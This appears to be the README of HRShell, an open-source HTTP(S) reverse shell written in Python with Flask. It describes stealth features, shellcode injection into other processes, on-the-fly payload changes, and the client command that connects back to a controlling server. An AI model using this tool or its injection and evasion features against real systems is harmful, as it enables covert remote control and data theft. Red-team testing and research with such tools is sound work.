<div align="center">
<img src="images/0.png">

##### HRShell: An advanced HTTP(S) Reverse Shell built with Flask
[![GPLv3 license](https://img.shields.io/badge/license-GPLv3-blue.svg?style=flat-square)](https://github.com/chrispetrou/HRShell/blob/master/LICENSE) 
[![](https://img.shields.io/badge/python-3-yellow.svg?style=flat-square&logo=python&logoColor=white)](https://www.python.org/)
[![](https://img.shields.io/badge/Build%20with-Flask-blueviolet.svg?style=flat-square&logo=flask&logoColor=white)](https://palletsprojects.com/p/flask/)
[![version](https://img.shields.io/badge/version-1.7-lightgray.svg?style=flat-square)](https://github.com/chrispetrou/HRShell/blob/master/CHANGELOG.md) 
[![Known Vulnerabilities](https://snyk.io/test/github/chrispetrou/HRShell/badge.svg?style=flat-square&targetFile=requirements.txt)](https://snyk.io//test/github/chrispetrou/HRShell?targetFile=requirements.txt)

* * *

<img src="images/preview.svg" width="80%">
</div>
<br>

__HRShell__ is an HTTPS/HTTP reverse shell built with flask and is compatible with __python 3.x__. The `client.py` has been successfully tested on:
*   ![](https://img.shields.io/badge/-white.svg??style=for-the-badge&logo=linux&linux&logoColor=black) Linux ubuntu 18.04 LTS, Kali Linux 2019.3
*   ![](https://img.shields.io/badge/-white.svg??style=for-the-badge&logo=apple&windows&logoColor=black) macOS Mojave/Catalina
*   ![](https://img.shields.io/badge/-white.svg??style=for-the-badge&logo=windows&windows&logoColor=black) Windows 7/10

while the `server.py` is compatible with Unix systems (_Windows support comming soon..._)

### Features

*   It's stealthy
*   __TLS__ support 🔑
    -   Either using _on-the-fly_ certificates or
    -   By specifying a cert/key pair (_more details below..._)
*   Shellcode injection 💉 (_more details below..._)
    -   Either shellcode injection in a thread/spawned-process of the current running process
        *   Platforms supported so far: 
            *   __Windows x86__   
            *   __Unix x86__
            *   __Unix x64__
    -   or shellcode injection into another process (`migrate <PID>`) by specifying its PID
        *   Platforms supported so far: 
            *   __Windows x86__
            *   __Windows x64__
*   Shellcode can be set/modified on the fly from the server (_more details below..._)   
*   Proxy support on client.
*   Directory navigation (`cd` command and variants).
*   Interactive `history` command available on Unix systems.
*   `download/upload/screenshot/hex` commands available.
*   Pipelining (`|`) & chained commands (`;`) are supported
*   Support for every non-interactive (_like gdb, top etc..._) command
*   Server is both HTTP & HTTPS capable.
*   It comes with two built-in servers 🌐 so far... _flask built-in_ & _tornado-WSGI_ while it's also compatible with other production servers like [`gunicorn`](http://gunicorn.org/) and [`Nginx`](https://www.nginx.com/).
*   Both `server.py` and `client.py` are easily extensible.
*   Since the most functionality comes from server's endpoint-design it's very easy to write a client in any other language _e.g. java, GO etc..._

<sub>*For version changes check-out [CHANGELOG](https://github.com/chrispetrou/HRShell/blob/master/CHANGELOG.md).</sub>

### Details
* * *

### Stealthy :shipit:
HRShell is stealthy since it uses the HTTP(S) protocol as the communication method between client and server. In addition when TLS is in use the traffic is also encrypted. Also if the CERT is not hand coded on client-side (_which is a feasible option_) and the `upload` command is not used, then `client.py` doesn't touches the disk at all.

### TLS 🔑

__Server-side:__
Unless `--http` option is specified, by default `server.py` is HTTPS using _on-the-fly_ certificates, since on-the-fly certificates are a built-in flask-feature. But if `-s tornado` option is specified in order to make the server use TLS, a `--cert` and a `--key` option must be specified like so:

```
python server.py -s tornado --cert /path/cert.pem --key /path/key.pem
```

Either "real" certificates can be used or another way to generate a cert/key pair is e.g. either using [mkcert](https://github.com/FiloSottile/mkcert) or [openssl](https://www.openssl.org/) directly like so:

```
openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365
```

A cert/key pair can also be used with the flask-server:
```
python server.py --cert /path/cert.pem --key /path/key.pem
```

> ⚠️ If the server is using TLS, then by design the client can't use `http://...` to connect to the server, but must explicitly use `https` instead.

__Client-side:__
By default client's SSL _verification_ is disabled, unless:
*   either the `--cert` parameter is specified e.g.:
    ```
    python client.py -s https://192.168.10.7:5000 --cert /path/cert.pem
    ```
*   or the `CERT` variable, instead of the default `None` value is set beforehand with a valid certificate e.g.:
    ```python
    CERT = """
    -----BEGIN CERTIFICATE-----
    MIIBoDCCAUoCAQAwDQYJKoZIhvcNAQEEBQAwYzELMAkGA1UEBhMCQVUxEzARBgNV
    BAgTClF1ZWVuc2xhbmQxGjAYBgNVBAoTEUNyeXB0U29mdCBQdHkgTHRkMSMwIQYD
    VQQDExpTZXJ2ZXIgdGVzdCBjZXJ0ICg1MTIgYml0KTAeFw05NzA5MDkwMzQxMjZa
    ...
    -----END CERTIFICATE-----
    """
    ```
    In this case _client.py_ will attempt to create a hidden _.cert.pem_ file on the fly and will use that instead.

> ⚠️ That the SSL verification is disabled by default on client **doesn't** mean in any case that the TLS is disabled too, **TLS will be enabled** if the server uses it - so **TLS depends completely on the server**. The `--cert` option _on client_ is there just as an alternative way for the server-client to have an encrypted session and that's all. 

### Shellcode injection 💉

There are two "modes" of shellcode injection using the two following commands respectively:

1. `migrate <PID>`: Using this command we can inject shellcode into the memory space of another process by specifying its PID. For now this command can only be applied at __Windows x86/x64__ platforms!

<img src="images/1.png">

2. `inject shellcode`: Using this command a new thread (_or spawned process on unix systems_) of our current process is created and the shellcode injection occurs in its memory space. As a result our HTTP(S) shell is not affected by the injection. The platforms where this command can be applied are: __Unix x86/x64, Windows x86__ platforms!

<img src="images/2.png">

##### Notes

*   In case the injection happens on a process, then process-permissions play a very important role. It's not always possible to inject on any process due to lack of appropriate privileges.

### Set/Modify shellcode

There are two ways you can specify/set what type of shellcode you want the client to execute:

*   Either pre-set `shellcode` variable on `client.py` script to be a valid shellcode or
*   Use the `set shellcode <shellcode-id>` command to do that on the fly. With this command you can update your shellcode on client-side from server-side as many times as you like!

<img src="images/3.png" width="60%">

The first way is pretty straight forward. However in order to use the second and more convenient way (_since you can also modify an already specified shellcode_) you have to set `shellcodes/utils.py` script such that it contains the shellcode(s) of your choise. The script contains an example of how you can do that.

> 💡 You can modify/update `shellcodes/utils.py` script even after you've launched `server.py` as many times as you want, since `server.py` will dynamically use the most updated/recent version. In this way you can set & modify shellcodes on the go...

### Available commands:

Special commands:

<img src="images/4.png" width="70%">

Any other command is supported if it's __not__ interactive like _e.g. gdb, top etc..._ Also by typing `python server.py -h` or `python client.py -h` you can get information the server and client available arguments.

__Note:__ If a client is connected with the server and we want to terminate the server, before press <kbd>CTRL</kbd>+<kbd>C</kbd>, we have to close the connection using the `exit` command.

### Creating custom commands
__Client-side:__

In order to create a _custom_ command, generally:
*   a regex rule that describes the command must be defined on client-side
*   the code to handle that command must be added as an `elif` statement also on client-side.

__Server-side:__

If the command demands the existence of a new-endpoint on server-side, then:
*   to define the endpoint:
    ```python
    @app.route('/custom_endpoint/<arg>')
    def custom_endpoint(arg):
        """
        documentation if needed
        """
        ...
        return ...
    ```
*   then edit `handleGET()` to redirect the client to that endpoint:
    ```python
    @app.route('/')
    def handleGET():
        ...
        return redirect(url_for('custom_endpoint',
            arg=...)
            )
    ```
*   do the appropriate edits in `handlePOST()` to handle the presentation of the results.

#### Script-Arguments

Both scripts (_server.py_ and _client.py_) can be customized through arguments:

__server.py__
```
$ python server.py -h
usage: server.py [-h] [-s] [-c] [--host] [-p] [--http] [--cert] [--key]

server.py: An HTTP(S) reverse-shell server with advanced features.

arguments:
  -h, --help      show this help message and exit
  -s , --server   Specify the HTTP(S) server to use (default: flask).
  -c , --client   Accept connections only from the specified client/IP.
  --host          Specify the IP to use (default: 0.0.0.0).
  -p , --port     Specify a port to use (default: 5000).
  --http          Disable TLS and use HTTP instead.
  --cert          Specify a certificate to use (default: None).
  --key           Specify the corresponding private key to use (default: None).
```
__client.py__
```
$ python client.py -h
usage: client.py [-h] [-s] [-c] [-p]

client.py: An HTTP(S) client with advanced features.

arguments:
  -h, --help      show this help message and exit
  -s , --server   Specify an HTTP(S) server to connect to.
  -c , --cert     Specify a certificate to use.
  -p , --proxy    Specify a proxy to use [form: host:port]
```

### 📦 Requirements:

To install the server-requirements:

```
pip install -r requirements.txt --upgrade --user
```

#### :pushpin: TODO
- [ ] Add more commands and features.
- [ ] Fix potential bugs.

#### :thought_balloon: Contributions & Feedback

Feedback and contributions are welcome. If you find any bug or have a feature request feel free to open an issue, and as soon as I review it I'll try to fix it.

### Disclaimer
>This tool is only for testing and academic purposes and can only be used where strict consent has been given. Do not use it for illegal purposes! It is the end user’s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this tool and software in general.

### Credits & References

*   Seitz J. Gray Hat Python: Python programming for hackers and reverse engineers. no starch press; 2009 Apr 15.
*   [PyShellCode](https://github.com/thomaskeck/PyShellCode)
*   A great article found [here](http://www.debasish.in/2012/04/execute-shellcode-using-python.html).
*   Client's `hexdump` function taken from [this great gist](https://gist.github.com/7h3rAm/5603718).
*   The HRShell logo is made with [fontmeme.com](https://fontmeme.com/graffiti-fonts/)!

### License

This project is licensed under the GPLv3 License - see the [LICENSE](LICENSE) file for details.
